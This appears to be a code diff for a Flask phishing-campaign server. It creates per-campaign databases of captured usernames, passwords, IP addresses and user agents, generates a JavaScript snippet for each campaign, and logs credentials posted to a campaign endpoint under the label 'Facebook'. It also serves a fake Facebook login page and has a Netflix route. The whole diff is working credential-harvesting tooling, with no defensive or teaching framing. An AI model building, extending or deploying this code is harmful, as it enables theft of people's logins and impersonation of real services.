@@ -44,13 +44,17 @@ def create_new_campaign_db(user_id, campaign_name):
     cursor = conn.cursor()
 
     cursor.execute('''
-    CREATE TABLE IF NOT EXISTS credentials (
+    CREATE TABLE credentials (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
+        page TEXT NOT NULL,
         username TEXT NOT NULL,
         password TEXT NOT NULL,
-        page TEXT NOT NULL
-    )
+        ip TEXT NOT NULL,
+        user_agent TEXT NOT NULL,
+        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+    );
     ''')
+
     conn.commit()
     conn.close()
 
@@ -182,6 +186,10 @@ def remove_campaign(user_id, campaign_name):
             conn.close()
             print("Database connection closed.")
 
+
+#################################################################
+# ROUTES  >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 @app.route('/campaigns/<user_id>', methods=['GET'])
 def get_campaigns(user_id):
     user_db_folder = os.path.join(USERS_DIR, user_id, DBS_DIR)
@@ -214,7 +222,26 @@ def get_campaign():
     }
     
     return jsonify(campaigns_with_data), 200
-       
+
+@app.route('/campaigns/fetch_campaign/script', methods=['POST'])
+def get_campaign_script():
+    data = request.json
+    user_id = str(data.get("user_id"))
+    campaign_name = str(data.get("campaign_id"))
+
+    db_path = os.path.join(USERS_DIR, str(user_id), DBS_DIR, f'{campaign_name}.db')
+    
+    if not os.path.exists(db_path):
+        return jsonify({"message": "User database folder not found"}), 404
+        
+
+    campaign_js_script = create_js_script(user_id, campaign_name) 
+ 
+    return jsonify({
+            "message": "Campaign created successfully", 
+            "js": campaign_js_script
+        }), 200
+        
 @app.route('/campaigns/create', methods=['POST'])
 def create_campaign():
     data = request.json
@@ -235,20 +262,13 @@ def create_campaign():
     
     campaigns_db_path = create_campaigns_db(user_id, campaign_name)
     if not campaigns_db_path:
-
         # Remove the campaign created because something when wrong in generating the code
         remove_db_file(campaign_db_file)
         
         return jsonify({"message": "Error in creating campaign"}), 409
     
     campaign_js_script = create_js_script(user_id, campaign_name) 
-    js_file = create_campaign_js_file(user_id, campaign_name, campaign_js_script)
-    
-    if not js_file:
-        remove_campaign(user_id, campaign_name)
-        remove_db_file(campaign_db_file)
-        return jsonify({"error": "Error in creating the campaign"}), 409
-    
+ 
     return jsonify({
             "message": "Campaign created successfully", 
             "js": campaign_js_script
@@ -262,16 +282,16 @@ def campaign_page(user_id, campaign_name):
 
     if not os.path.exists(campaign_db_path):
         return "Campaign not found", 404
-
+  
+    data = request.json
 
     if request.method == 'POST':
-        username    = request.form.get('email')
-        password = request.form.get('pass')
+        username = data['email']
+        password = data['password']
 
         if username and password:
-            log_credentials(campaign_db_path, "Facebook", username, password)
-
-            
+            print(username, password)
+            log_credentials(campaign_db_path, "Facebook", username, password)     
         
     return "True", 200
 
@@ -315,15 +335,9 @@ def list_templates():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route('/facebook', methods=['GET', 'POST'])
+@app.route('/')
 def facebook():
-    """Fake Facebook login page"""
-    if request.method == 'POST':
-        username = request.form.get('email')
-        password = request.form.get('pass')
-        log_credentials("Facebook", username, password)
-        return redirect("https://www.facebook.com/")  # Redirect after capturing
-        
+    
     return render_template('facebook.html')
 
 @app.route('/netflix', methods=['GET', 'POST'])
